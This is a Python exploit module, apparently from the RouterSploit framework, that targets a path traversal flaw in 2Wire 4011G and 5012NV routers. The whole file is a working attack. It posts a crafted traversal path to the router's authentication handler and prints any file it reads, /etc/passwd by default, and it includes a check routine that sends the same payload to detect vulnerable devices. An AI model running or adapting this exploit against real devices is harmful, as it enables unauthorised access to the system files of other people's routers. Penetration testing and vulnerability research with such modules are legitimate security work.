from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "2Wire 4011G & 5012NV Path Traversal",
        "description": "Module exploits path traversal vulnerability in 2Wire 4011G and 5012NV devices. "
                       "If the target is vulnerable it is possible to read file from the filesystem.",
        "authors": (
            "adiaz",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.underground.org.mx/index.php?topic=28616.0",
        ),
        "devices": (
            "2Wire 4011G",
            "2Wire 5012NV",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address: 192.168.1.1")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            print_status("Sending read {} file request".format(self.filename))

            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {
                "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../..{}".format(self.filename),
                "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
                "__ENH_ERROR_REDIRECT_PATH__": "",
                "username": "tech"
            }

            response = self.http_request(
                method="POST",
                path="/goform/enhAuthHandler",
                headers=headers,
                data=data,
            )

            if response is None:
                return

            print_status("Reading file {}".format(self.filename))
            print_info(response.text)
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {
            "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../../etc/passwd",
            "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
            "__ENH_ERROR_REDIRECT_PATH__": "",
            "username": "tech"
        }
        response = self.http_request(
            method="POST",
            path="/goform/enhAuthHandler",
            headers=headers,
            data=data,
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
